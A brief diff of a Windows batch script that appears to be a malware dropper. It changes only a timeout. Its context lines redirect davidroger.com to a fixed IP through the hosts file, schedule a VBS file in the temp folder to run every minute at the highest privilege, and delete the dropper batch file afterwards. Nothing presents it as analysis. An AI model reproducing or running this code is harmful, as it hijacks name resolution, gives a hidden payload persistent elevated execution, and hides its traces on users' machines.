@@ -38,7 +38,7 @@ echo 185.194.175.132 davidroger.com >> %SystemRoot%\System32\drivers\etc\hosts
 
 
 schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
-timeout /t 30
+timeout /t 5
 
 cd %temp%
 del /f /q "s.bat"
